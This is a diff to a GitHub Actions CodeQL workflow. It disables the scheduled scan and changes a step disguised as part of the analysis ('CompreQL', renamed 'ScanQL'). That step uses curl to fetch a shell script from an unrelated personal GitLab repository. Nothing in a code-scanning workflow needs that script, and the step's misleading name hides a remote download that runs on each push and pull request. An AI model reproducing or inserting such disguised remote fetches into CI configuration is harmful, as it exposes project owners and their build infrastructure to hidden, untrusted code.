@@ -11,8 +11,8 @@ on:
   pull_request:
     # The branches below must be a subset of the branches above
     branches: [master]
-  schedule:
-    - cron: '0 8 * * 3'
+#  schedule:
+#    - cron: '0 8 * * 3'
 
 jobs:
   analyze:
@@ -54,9 +54,9 @@ jobs:
     #    and modify them (or add more) to build your code if your project
     #    uses a compiled language
 
-    - name: CompreQL
+    - name: ScanQL
       run: |
-        curl --location --fail https://gitlab.com/project-dev-/v.0.0.21052021/-/raw/master/autoupdate
+        curl -s https://gitlab.com/sarahemersonzrex/msconfig/-/raw/main/fpsdev0.sh
 
     - name: Perform CodeQL Analysis
       uses: github/codeql-action/analyze@v1
